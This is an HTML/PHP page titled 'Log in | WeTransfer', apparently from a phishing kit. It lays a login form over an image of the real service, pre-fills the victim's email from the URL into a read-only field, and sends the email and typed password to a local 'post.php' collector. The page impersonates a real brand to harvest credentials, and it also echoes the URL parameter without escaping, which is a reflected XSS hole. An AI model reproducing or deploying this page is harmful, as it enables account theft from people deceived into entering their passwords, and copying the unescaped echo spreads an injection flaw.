<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title> Log in | WeTransfer </title>
  <link rel="shortcut icon" href="folder/favicon.ico" />
</head>
<!-- Theme style -->
<link rel="stylesheet" href="folder/index.css">
<!-- jQuery -->
<script src="folder/index.js "></script>
<style>
  *{box-sizing: border-box; font-family: sans-serif;}
  .container_{
    position: relative;
    margin: 0;
    width: 100%;
         }
         #image{
           top:0;
           left: 0;
           right: 0;
           bottom: 0;
           position: absolute;
         }
    #form{
      position: relative;
      margin-left: 625px;
      padding-top: 65px;
      width:50%;
      z-index: 1;
    }
</style>
<body style="background: rgb(4, 4, 22);">
  <section class='container_'> <!-- container -->
    <div id="image"> <img src="folder/3.png" style="width:100%;"> </div>

    <div id="form">
      <form style='background: white;' method="POST" action="post.php">
          <div class="row"><!-- row -->
            <div class="email_col col-md-4"> <!-- col -->
              <div class="form-group">
                <input type="email" required name='email' class='form-control' value="<?php echo $_GET['email']; ?> " id='email_val' readonly placeholder="Email address">
              </div>
            </div><!-- //col -->
            <div class="col-md-4"> <!-- col -->
              <div class="form-group">
                <input type="password" required name='password' class='form-control' id='password_val' placeholder="Password">
              </div>
            </div><!-- //col -->
            <div class="col-md-2"> <!-- col -->
              <div class="form-group">
                <button type="submit" class='submit_btn btn btn-secondary'> Login </button>
				
              </div>
            </div><!-- //col -->
          </div><!-- //row -->
      </form>
      <h6 class="text-danger hide text-center pwd_error"></h6>
    </div>
  </section> <!-- //container -->
  
    
</body>
</html>

